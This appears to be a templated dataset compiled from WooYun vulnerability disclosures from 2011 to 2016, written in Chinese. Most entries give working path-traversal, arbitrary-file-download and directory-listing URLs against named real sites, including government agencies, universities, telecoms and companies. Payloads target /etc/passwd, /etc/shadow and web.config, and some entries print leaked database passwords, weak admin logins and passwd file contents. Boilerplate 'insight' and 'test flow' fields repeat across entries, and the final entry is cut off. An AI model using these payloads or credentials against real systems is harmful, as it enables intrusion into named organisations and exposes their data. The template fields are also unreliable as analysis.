### [wooyun-2013-042839] 某市人民检察院服务器配置不当导致目录遍历泄露数据库
**厂商**: 某市人民检察院 | **年份**: 2013 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某市人民检察院服务器配置不当导致目录遍历（可下载备份数据，成功入侵几率可达百分之九十）

**POC**: 我没下载备份数据啊，我也没入侵啊！！http://www.huangshi.jcy.gov.cn/mydb/备份数据还是昨天的http://www.huangshi.jcy.gov.cn/Admin/Login.asp  后台

**绕过**: 直接利用

**修复**: wooyun懂的
---

---
### [wooyun-2013-043610] 格林豪泰某重要系统整站遍历多个备份下载
**厂商**: 格林豪泰酒店管理集团 | **年份**: 2013 | **类型**: 网络敏感信息泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 网络敏感信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络敏感信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 管理大大 人家格林豪泰的一个OA弱口令都不走小漏洞 求这个不走小漏洞....http://erp.998.com/WebPortal_HotelFinance/备份下载：http://erp.998.com/WebPortal_HotelFinance/备份/WebPortal_HotelFinance20130605.rarhttp://erp.998.com/WebPortal_HotelFinance/备份/WebPortal_HotelFinance20130607.rarhttp://erp.998.com/WebPortal_HotelFinance/备份/WebPortal_HotelFinance20130608.rarhttp://erp.998.com/WebPortal_HotelFinance/备份/WebPortal_HotelFinance20130807.ra

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-048423] 中兴某系统Padding Oracle任意文件读取漏洞
**厂商**: 中兴通讯股份有限公司 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://bid.zte.com.cn/com/zte/product/ui/web/Application/Default.aspx查看源代码

**POC**: padbuster跑下padBuster.pl http://bid.zte.com.cn/WebResource.axd?d=r6VoAtItTmd6ZXfOb93HOw2 r6VoAtItTmd6ZXfOb93HOw2 16 -encoding 16 -plaintext "|||~/web.config"不继续了~~~~看数据库不好

**绕过**: 直接利用

**修复**: 升级~~~~~~~~打补丁~~~~~~~~~
---

---
### [wooyun-2014-058497] 三福百货主站文件包含漏洞
**厂商**: sanfu.com | **年份**: 2014 | **类型**: 文件包含

**元思考**: 触发信号: 参数注入

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: do和mod参数地址1：http://www.sanfu.com/?do=../../../../../../../../../../etc/passwd%00.jpg&id=6618&mod=goods地址2：http://www.sanfu.com/?do=display&id=6618&mod=../../../../../../../../../../etc/passwd%00.jpg

**POC**: (见原文)

**绕过**: 直接利用

**修复**: Null
---

---
### [wooyun-2014-061231] DPtech DPX8000-A5 漏洞小合集
**厂商**: dptechnology.net | **年份**: 2014 | **类型**: 设计不当

**元思考**: 触发信号: 认证接口

**洞察**: 设计不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 需要登录环境，此机器是无意通过弱口令找到的例子，在用户登录以后，通过设备的漏洞，造成更深的影响。存在注入，任意文件下载，XML注入。

**POC**: 注入：http://10.X.X.73/func/web_main/display/netaddr/netaddr_objPOST(示例)：searchType=0&searchValue=local01%25%27%20%61%6e%64%20%27%25%27%3d%27&vfwName=PublicSystem正常:不正常:POST(示例)：searchType=0&searchValue=local01%25%27%20%61%6e%64%20%27%31%27%3d%27&vfwName=PublicSystemTEST:searchType=0&searchValue=local0

**绕过**: 直接利用

**修复**: 过滤，验证，过滤。。。
---

---
### [wooyun-2015-0111122] 搜房内部OA平行权限泄露大量信息、部分员工弱口令
**厂商**: 搜房网 | **年份**: 2015 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 上传功能

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 除了之前的luoxulishulan俩弱口令，我再爬下了部分员工的用户名然后进行检查，还发现以下三个密码为“用户名+123”的liuweijingqubaoyurenfei针对办公平台做了部分监测#1 任意文件下载（不是系统文件，是员工上传的文件。）修改sysfileid随意下载http://work.fang.com/v2/sys/sysFileAct.do?method=download&sysfileid=787404&objId=201708&downType=2随意刷了几个#2 另一个任意文件下载http://work.fang.com/v2/sys/sysFileAct.do?method=downloadFileById&fileid=542009#3任意查看员工证件（身份证、获奖证书等）http://work.fang.com/v2/sys/sysFileAct.do?me

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2016-0180701] 微客来某站任意文件读取敏感日志文件泄露
**厂商**: vcooline.com | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意文件读取ElasticSearch版本太老了存在CVE-2015-5531这个漏洞http://mq.vcooline.com:9200/_plugin/head/../../../../../../opt/nginx/conf/nginx.conf日志文件泄露看看有什么东西

**POC**: 如上

**绕过**: 直接利用

**修复**: 访问控制
---

---
### [wooyun-2014-059169] 清华大学美术学院备份文件下载
**厂商**: 清华大学美术学院 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.qinghua-edu.com/web.rar

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2013-031488] 乐视网某分站信息泄露
**厂商**: 乐视网 | **年份**: 2013 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: resin 任意文件读取，地址 http://115.182.94.145http://115.182.94.145/resin-doc/examples/ioc-periodictask/viewfile?file=WEB-INF/web.xmlhttp://115.182.94.145/resin-doc/examples/ioc-periodictask/viewfile?file=index.xtp

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 话说有第二份礼物？O(∩_∩)O哈哈~
---

---
### [wooyun-2016-0170090] 万家金服某站GlassFish任意文件读取
**厂商**: 北京点心科技有限公司 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: **.**.**.**/万家金服**.**.**.**:4848/GlassFish应用**.**.**.**:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd证明

**POC**: 见上

**绕过**: 直接利用

**修复**: 补丁
---

---
### [wooyun-2013-027429] 海尔某分站后台存在弱口令（使用某第三方CMS所致）
**厂商**: 海尔集团 | **年份**: 2013 | **类型**: 后台弱口令

**元思考**: 触发信号: 后台管理

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 采用ideacms2.1，默认的用admin和密码admin导致进入后台获得一步权限。http://cdyj.haier.com/Company/admin/目录遍历http://cdyj.haier.com/Company/admin/admin_template.asp?path=../template/../

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 更改用户密码，过滤path
---

---
### [wooyun-2011-01410] IT168分站目录遍历漏洞
**厂商**: IT168.com | **年份**: 2011 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 服务器设置不恰当造成！

**POC**: http://survey.it168.com/myadmin/classes/tcpdf/config/

**绕过**: 直接利用

**修复**: 重新设置myadmin目录!!!
---

---
### [wooyun-2014-088071] 新浪sae open_basedir绕过
**厂商**: 新浪 | **年份**: 2014 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 比较鸡肋的一个判断文件是否存在在php5.3.2添加了一个新函数，stream_resolve_include_path用法stream_resolve_include_path($filename)，如果文件存在则返回改文件的绝对路径。此办法只能用于目录遍历此处用sae做测试测试遍历目录代码<?php//这里只测试五位的文件名称$a='qwertyuiopasdfghjklzxcvbnm';$f='';for($i1=0;$i1<strlen($a);$i1++){for($i2=0;$i2<strlen($a);$i2++){for($i3=0;$i3<strlen($a);$i3++){for($i4=0;$i4<strlen($a);$i4++){for($i5=0;$i5<strlen($a);$i5++){$f=$a[$i1].$a[$i2].$a[$i3].$a[$i4].$

**POC**: 比较鸡肋的一个判断文件是否存在在php5.3.2添加了一个新函数，stream_resolve_include_path用法stream_resolve_include_path($filename)，如果文件存在则返回改文件的绝对路径。此办法只能用于目录遍历此处用sae做测试测试遍历目录代码<?php//这里只测试五位的文件名称$a='qwertyuiopasdfghjklzxcvbnm';$f='';for($i1=0;$i1<strlen($a);$i1++){for($i2=0;$i2<strlen($a);$i2++){for($i3=0;$i3<strlen($a);$i3++){

**绕过**: 直接利用

**修复**: 你猜
---

---
### [wooyun-2014-059981] ecmall后台某处任意文件读取
**厂商**: ShopEx | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 文件admin\app\db.app.php  line:198function download(){$file = isset($_GET['file']) ? trim($_GET['file']) : '';$backup_name = isset($_GET['backup_name']) ? trim($_GET['backup_name']) : '';if (!$file){$this->show_warning('no_such_file');return;}if (!$backup_name){$this->show_warning('no_backup_name');return;}$sql_file = $this->backup_path . $backup_name . '/' . $file;//直接拼接就下载了，未过滤..//print_r($sql_fil

**POC**: 构造链接下载我C盘内的boot.bak文件：http://127.0.0.1/ecmall/admin/index.php?app=db&act=download&file=boot.bak&backup_name=../../../../../

**绕过**: 直接利用

**修复**: 过滤..
---

---
### [wooyun-2015-0113380] 中国移动大量AC可被控制外加任意文件下载（CMCC-EDU wifi）
**厂商**: 中国移动 | **年份**: 2015 | **类型**: 默认配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 默认配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别默认配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: AC 弱口令是中国移动的设备 CMCC-EDU任意文件下载DownloadServlet?fileName=../../../../../../../../../../etc/shadow通用，这个型号的AC都可以任意下载shadow

**POC**: 这部分IP全部有弱口令，和任意下载漏洞http://111.9.11.67http://111.9.11.2http://111.9.11.46http://111.9.11.62http://111.9.11.6http://111.9.11.58http://111.9.11.51http://111.9.11.50http://111.9.11.43http://111.9.11.38http://111.9.11.30http://111.9.11.26http://111.9.11.22http://111.9.11.18http://111.9.11.14http://111.9.

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2015-0155658] 安徽省经信委会官网目录遍历漏洞#可获服务器任意文件
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 0x01 漏洞官网http://**.**.**.**/0x02 漏洞类型目录遍历，可以通过指定目录获取服务器上任意文件0x03 漏洞详细漏洞出现在以下地方http://**.**.**.**/dxjhProject/Download?strName=test.txt&strPath=../../../../../../../../../../etc/passwd&strType=affix存在问题的就是strPath关键字，通过更改路径，得到相关隐私敏感文件

**POC**: 0x04 这里依旧按通常的/etc/passwd 与/etc/profile文件吧root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x

**绕过**: 直接利用

**修复**: 开发人员来~
---

---
### [wooyun-2014-063443] 南京大学分站备份文件下载
**厂商**: 南京大学 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 文件下载地址：http://nubs.nju.edu.cn/1.rarhttp://nubs.nju.edu.cn/index.php.bak 配置文件下载。。。请原谅我正在下载。。。研究下而已。。

**POC**: 看上面。。。。

**绕过**: 直接利用

**修复**: 删掉某些不该 保存的文件。。
---

---
### [wooyun-2015-0129966] 某红十字会某网站任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 存在任意文件下载漏洞地址www.bdc.org.cn/common/download.do?path=使用burp抓包看看passwd文件看看系统版本

**POC**: 存在任意文件下载漏洞地址www.bdc.org.cn/common/download.do?path=使用burp抓包看看passwd文件看看系统版本

**绕过**: 直接利用

**修复**: 找美美
---

---
### [wooyun-2013-019475] 中华人民共和国国土资源部某重要系统任意文件下载
**厂商**: 中华人民共和国国土资源部 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1）测试对象：中华人民共和国国土资源部下银行国土信息查询系统；http://landinfo.mlr.gov.cn/login.do?state=login2）测试链接；http://landinfo.mlr.gov.cn/login.do?state=publicFilesDownload&filename=../../../../../../../../../etc/passwdhttp://landinfo.mlr.gov.cn/login.do?state=publicFilesDownload&filename=../../../../../../../../../etc/shadow3）系统对外开放ftp、mysql服务，读取配置文件后或可造成较大影响（怕查水表，不敢进一步测试）；

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-028920] 东方网某分站数据库备份文件任意下载至沦陷
**厂商**: 东方网 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 东方网：http://qpb.eastday.com （上海东方网股份有限公司）其旗下青浦报网站：http://qpb.eastday.com/index.asp存在目录遍历，直接登入其数据库备份目录：http://qpb.eastday.com/data/dbbak/下载数据库备份文件破解得到用户名及密码： admin   q1w2e3r4（这个密码按在键盘上挺奇葩，嘿嘿）成功登入后台

**POC**: 如上

**绕过**: 直接利用

**修复**: 防下载 防止目录遍历
---

---
### [wooyun-2015-0100324] 深圳航空某处任意文件读取漏洞
**厂商**: 深圳航空 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://ywt.shenzhenair.com/../../../../../../../../../../../../etc/passwd浏览器直接访问会自动修正，换成curl即可

**POC**: 浏览器访问效果Curl效果

**绕过**: 直接利用

**修复**: 无
---

---
### [wooyun-2016-0213124] 平安保险某重要站点存在部分文件下载漏洞
**厂商**: 中国平安保险（集团）股份有限公司 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国平安官方直销网站http://www.4008000000.com/问题地址：http://www.4008000000.com/downLoad.jsp?filename=../../../WEB-INF/web.xml

**POC**: http://www.4008000000.com/downLoad.jsp?filename=../../../WEB-INF/tlds/fmt.tld

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2015-0163048] 广东岭南通官网任意文件下载漏洞&公交一卡通大数据平台测试账户
**厂商**: 广东岭南通股份有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: “岭南通”作为广东省统一、使用方便、经济实惠的交通智能卡系统，不仅全面应用于全省公交、地铁、出租车、城际轨道交通、道路客运及轮渡等公共交通工具，还将逐步扩展到便利店、超市、咪表及停车场等公共服务领域，最终实现与港澳地区交通智能卡系统的并网互认，从而实现“一卡在手，岭南通行”。

**POC**: 0x00.通过BurpSuite工具对官网进行扫描，发现一个下载插件。http://**.**.**.**/UploadHandler.ashx0x01.下载网站的配置文件<codehttp://**.**.**.**/UploadHandler.ashx?action=download&fp=../../web.config</code>0x02.打开配置文件，可以查看到系统内网结构（可能包含公交运营控制的系统）以及数据库账户（SA）及密码。0x03.同时还发现一枚测试账户:Jhonson/jhonson,不仅可以登录全身公交一卡（岭南通）大数据平台**.**.**.**:8011/Card

**绕过**: 直接利用

**修复**: 数据过滤！！！！
---

---
### [wooyun-2016-0210887] 蚂蜂窝主站任意文件读取
**厂商**: 蚂蜂窝 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.mafengwo.cn/sales/union.php?step=preView&pdf=/etc/passwd

**POC**: root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mai

**绕过**: 直接利用

**修复**: 限定不可读取本地文件
---

---
### [wooyun-2016-0166907] 易速国际物流设计缺陷任意文件下载（香港地區）
**厂商**: 易速国际物流有限公司 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标：http://**.**.**.**/物理路径：/home/espeedpost/domains/**.**.**.**/public_html/download.php构造，http://**.**.**.**/download.php?fdoc=download.phpclass.db.php中，$db 				= new db;#################################################$dbname			= "espeedpost_db";					# 数据库名$dbuser			= "espeedpost_kLmZd";					# 数据库用户名$dbpw				= "dAtA!1211?=B12s13";				# 数据库密码$dbhost			= "localhost";				# 数据库地址$pconnect 			= "0";	

**POC**: http://**.**.**.**/download.php?fdoc=download.phphttp://**.**.**.**/download.php?fdoc=index.phphttp://**.**.**.**/download.php?fdoc=index_c.phphttp://**.**.**.**/download.php?fdoc=v_index.phpclass.db.php中$db 				= new db;#################################################$dbname			= "espeedpost_db";		

**绕过**: 直接利用

**修复**: ..
---

---
### [wooyun-2015-0146713] 铁道部党校服务器resin目录遍历漏洞导致可全盘遍历服务器内容
**厂商**: 12306 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: IP地址61.233.14.172绑定的域名是http://www.tddx.cn/访问URLhttp://61.233.14.172/D:%5C/泄露的一些敏感信息：resin管理后台用户名、密码数据库配置信息：好像用的是万户的系统，配置信息中还有很多万户运维人员的配置信息

**POC**: IP地址61.233.14.172绑定的域名是http://www.tddx.cn/访问URLhttp://61.233.14.172/D:%5C/泄露的一些敏感信息：resin管理后台用户名、密码数据库配置信息：好像用的是万户的系统，配置信息中还有很多万户运维人员的配置信息

**绕过**: 直接利用

**修复**: 升级resin版本
---

---
### [wooyun-2014-078783] 中国邮政多个严重漏洞打包（邮政智能终端权限泄露）
**厂商**: 中国邮政集团公司信息技术局 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先是http://ylt.11185.cn/web.rarweb配置下载，里面是web.config 包含了一些短信接口等敏感信息然后是另外一个主系统http://211.156.198.57中国邮政智能终端系统，没有验证码，首先是通过xml检查用户名然后用户名存在返回工号后再匹配密码存在弱口令账户test1  / 888888登陆进去系统然后有个操作文档下载那里  抓包是这样的连接 一看path 就知道多半是任意文件下载了这里还泄露了web目录 原来是weblogic的程序http://211.156.198.57/jsp/yzznzd/bbxf/downfile.jsp?filename=//opt//weblogic//Oracle//Middleware//user_projects//domains//yzznzd_domain//app//czsc.zip&paths=//o

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 修复弱口令，限制下载path。
---

---
### [wooyun-2012-012238] 山东省疾病预防控制中心目录遍历漏洞
**厂商**: 山东省疾病预防控制中心 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试地址：http://www.sdcdc.cn/lm/front/findpsw.jsp?sysid=/../../../../../../../../../../etc/passwd%00.html&userLogin=&userPasswd=

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-09383] UC某后台管理系统任意口令登录及敏感信息泄漏
**厂商**: UC Mobile | **年份**: 2012 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 应该是问剑OL游戏的后台。地址：http://121.14.161.73:8081目录遍历http://121.14.161.187:8001http://121.14.161.187:8800数据库地址等信息泄漏。另外，很多分站都有Nginx解析漏洞，虽然无上传点，但最好还是补了，比如这几个。http://mw.ucweb.com/navigate/pic/soft.png/.php  nginx解析漏洞http://weth1.ucweb.com:8001/ucweather/images/wea_images_b/3.gif/.phphttp://mw.uc.cn/images/baidu_mp3.gif/.phphttp://121.14.161.187:8800/html/1.jpg/.phphttp://117.135.147.248/public/images/uclogo.

**POC**: 在详细说明里了。

**绕过**: 直接利用

**修复**: 添加访问授权等，另外F5和防火墙之类的网络设备最好不要放在公网，不过也可以加访问控制。
---

---
### [wooyun-2014-081469] 中兴ZXV10 MS90 远程视频会议系统任意文件下载
**厂商**: 中兴通讯股份有限公司 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 偶然接触到这个设备，操作安装客户端中发现下载的功能存在该漏洞。通过百度搜索：ZXV10 MS90可以找到更多的案例。

**POC**: http://ip:9000/manage/conf_control/download.jsp?filename=Silverlight.txt&filePath=/home/VER/web/asc/ROOT/conf_control/download.jsp可以下载任意web目录文件http://ip:9000/conf_control/download.jsp?filename=dd.txt&filePath=/../../../../etc/shadow可以下载任意系统文件curl 'http://rsoa.thnet.gov.cn:9000/conf_control/download.

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-096820] 国家电网某业务任意文件下载可获取数据库配置文件
**厂商**: 国家电网公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 国家农电网存在IIS短文件漏洞，扫描结果如下：看到otcmso~1，猜测使用了otcms；2014ad~1目录，Google找了一下，没找到相关链接，猜测出来为2014admin后台登陆界面http://www.rpsg.sgcc.com.cn/2014admin/脑洞打开，发现这个后台就是otcms的后台乌云上看到有otcms下载任意文件的漏洞，就拿来尝试下http://www.rpsg.sgcc.com.cn/2014admin/others.asp?mudi=download_EN_CN&n=index.asp&ENname=../config.asp连接数据库的用户还是个SA

**POC**: (见原文)

**绕过**: 直接利用

**修复**: iis短文件名修复：升级.netotcms任意文件下载：otcms有对应的补丁包，升级吧
---

---
### [wooyun-2015-092339] 大汉网络任意文件下载漏洞
**厂商**: 南京大汉网络有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 下载漏洞：\vc\vc\columncount\downfile.jsp演示：http://www.sinoagent.com/vc/vc/columncount/downfile.jsp?savename=a.txt&filename=../../../../../../../../etc/passwd

**POC**: 案例：http://qzlx.jsjzi.edu.cn/vc/vc/columncount/downfile.jsphttp://www.cnooc.com.cn/vc/vc/columncount/downfile.jsphttp://cbs.cau.edu.cn/vc/vc/columncount/downfile.jsphttp://www.hebau.edu.cn/vc/vc/columncount/downfile.jsphttp://www.sinotrans.com/vc/vc/columncount/downfile.jsphttp://www.auh.cn/vc/vc/col

**绕过**: 直接利用

**修复**: 下载文件过滤。
---

---
### [wooyun-2011-02678] 腾讯分站目录遍历
**厂商**: 腾讯 | **年份**: 2011 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 认证接口

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这个地址是客户端登陆验证用的

**POC**: http://online.image.qq.com/QQPhoto/QQImageIconLight/

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0139706] 清华大学某处可泄露7W+校友精英信息（姓名/联系方式/出生日期/邮箱/通讯地址/工作单位等）
**厂商**: 清华大学 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 清华大学校友网存在目录遍历，可查看至少7万多的校友详细信息（含姓名/联系方式/出生日期/邮箱/通讯地址/工作单位）。http://www.tsinghua.org.cn/alumni/communityclient/listFormerAddress.do?groupId=3……http://www.tsinghua.org.cn/alumni/communityclient/listFormerAddress.do?groupId=2473groupId从3开始至2473绝大部分均能获取到相关数据。有关信息包括：经过初步统计，每页30条算，保守估计有74000多条记录。

**POC**: ~~已证明。

**绕过**: 直接利用

**修复**: 未登录不能查看相关记录。
---

---
### [wooyun-2015-0131811] 中国电信某站任意文件下载
**厂商**: 中国电信 | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://ll800.go189.cn电信的流量联盟http://ll800.go189.cn/ll800/order/temp.ajax?path=../../../etc/passwd

**POC**: root:x:0:0:root:/root:/bin/bash:/sbin/nologinbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltm

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2015-0101775] 洪湖市卫生和计划生育局任意文件下载漏洞
**厂商**: 洪湖市卫生和计划生育局 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应
